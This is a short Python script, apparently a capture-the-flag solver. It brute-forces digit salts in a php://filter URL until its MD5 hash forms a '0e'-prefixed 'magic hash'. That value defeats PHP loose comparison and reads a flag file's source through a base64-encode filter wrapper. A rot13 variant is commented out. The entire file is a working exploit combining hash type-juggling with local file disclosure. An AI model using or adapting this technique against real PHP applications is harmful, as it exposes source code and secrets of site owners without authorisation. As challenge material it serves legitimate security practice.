from hashlib import md5
from multiprocessing import Pool
import itertools
import string


def get_hash(p):
    KEY = "114596299"
    return md5((KEY + "__" + p).encode()).hexdigest()


def is_right_url(url):
    value = get_hash(url)
    if value[:2] == "0e" and value[2:].isnumeric():
        print(url)


def format_url(*args):
    salt = "".join(*args)
    url = f"php://filter/read=convert.%62%61%73%65%36%34-encode|{salt}/resource=./y0.flag.php"
    # url = f"php://filter/read=string.rot13/{salt}/resource=index.php"
    return url


def get_url(*args):
    return is_right_url(format_url(*args))


def brute_force():
    for number in range(1, 20):
        print(number)
        for salt in itertools.product(string.digits, repeat=number):
            get_url(salt)


if __name__ == '__main__':
    brute_force()
